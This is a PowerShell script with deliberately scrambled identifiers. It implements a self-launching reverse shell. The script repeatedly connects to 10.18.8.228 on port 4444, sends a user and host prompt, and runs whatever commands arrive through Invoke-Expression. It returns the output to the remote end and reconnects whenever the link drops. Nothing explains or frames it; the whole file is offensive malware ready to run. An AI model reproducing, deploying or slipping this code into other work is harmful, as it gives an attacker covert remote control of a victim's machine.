class epfJNQHiTkN {
    
    [string]$NzBcvDOzdIZ = "10.18.8.228"
    [int]$jkiGObmBMNMuSzup = 4444

    $GoLMB
    $ZyeiQKnuESzWwGk
    $fLADnXgqkMLCIaUcv
    $CAhnKEuF
    $BHLJtuSoiwmJqmbIBkrGSfC
    $FwXTzbWdlEL
    [int]$txgKpAKxIXRgqUTJycEd = 50*1024

    gVERUcBo() {
        $this.ZyeiQKnuESzWwGk = $false
        while ($true) {
            try {
                $this.ZyeiQKnuESzWwGk = New-Object Net.Sockets.TcpClient($this.NzBcvDOzdIZ, $this.jkiGObmBMNMuSzup)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.UFzYIVrMrpHHeaJAFNJCZ()
    }

    UFzYIVrMrpHHeaJAFNJCZ() {
        $this.GoLMB = $this.ZyeiQKnuESzWwGk.GetStream()
        $this.CAhnKEuF = New-Object Byte[] $this.txgKpAKxIXRgqUTJycEd
        $this.FwXTzbWdlEL = New-Object Text.UTF8Encoding
        $this.fLADnXgqkMLCIaUcv = New-Object IO.StreamWriter($this.GoLMB, [Text.Encoding]::UTF8, $this.txgKpAKxIXRgqUTJycEd)
        $this.BHLJtuSoiwmJqmbIBkrGSfC = New-Object System.IO.StreamReader($this.GoLMB)
        $this.fLADnXgqkMLCIaUcv.AutoFlush = $true
    }

    BBhEZCMgCyE() {
        $this.gVERUcBo()
        $this.WhMUAycioRt()
    }

    GhFsTPlNHacN($cMTSNtUJvyqcZGGssWA) {
        try {
            [byte[]]$ffcrUiABbYPaJRvpLPx = [text.Encoding]::Ascii.GetBytes($cMTSNtUJvyqcZGGssWA)
            $this.fLADnXgqkMLCIaUcv.Write($ffcrUiABbYPaJRvpLPx, 0, $ffcrUiABbYPaJRvpLPx.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.BBhEZCMgCyE()
        }
    }

    [string] trUGGdwOqtM() {
        try {
            $NazsHbgjKSiMzNpOCmPnZ = $this.GoLMB.Read($this.CAhnKEuF, 0, $this.txgKpAKxIXRgqUTJycEd)    
            $CKMxhLf = ($this.FwXTzbWdlEL.GetString($this.CAhnKEuF, 0, $NazsHbgjKSiMzNpOCmPnZ))
            return $CKMxhLf
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.BBhEZCMgCyE()
            return ""
        }
    }

    [string] ueDHyizceZ($ViXdjuHdtreQnXosbjm) {
        Write-Host $ViXdjuHdtreQnXosbjm
        try { 
            $YtXnsKh = Invoke-Expression $ViXdjuHdtreQnXosbjm | Out-String
        }
        catch {
            $YLNCLPMgHkJUEsPuUanNeb = $_.Exception
            $aeyQSamBFVRGrGRqKwZ = $_.Message
            $YtXnsKh = "`n$_`n"
        }
        return $YtXnsKh
    }

    [string] qVOHoeo() {
        $hxcaXPXqP = [Environment]::UserName
        $aYxtKOgmFzzyUY = [System.Net.Dns]::GetHostName()
        $GAMdOeilQb = Get-Location
        return "$hxcaXPXqP@$aYxtKOgmFzzyUY [$GAMdOeilQb]~$ "
    }

    WhMUAycioRt() {
        while ($this.ZyeiQKnuESzWwGk.Connected) {
            $this.GhFsTPlNHacN($this.qVOHoeo())         
            $CKMxhLf = $this.trUGGdwOqtM()
            $YtXnsKh = "`n"
            if ([string]::IsNullOrEmpty($CKMxhLf)) {
                continue
            }
            $YtXnsKh = $this.ueDHyizceZ($CKMxhLf)
            $this.GhFsTPlNHacN($YtXnsKh + "`n")
            $this.GoLMB.Flush()
        }
        $this.ZyeiQKnuESzWwGk.Close()
        $this.BBhEZCMgCyE()
    } 
}

$YSTJwE = [epfJNQHiTkN]::new()
$YSTJwE.BBhEZCMgCyE()






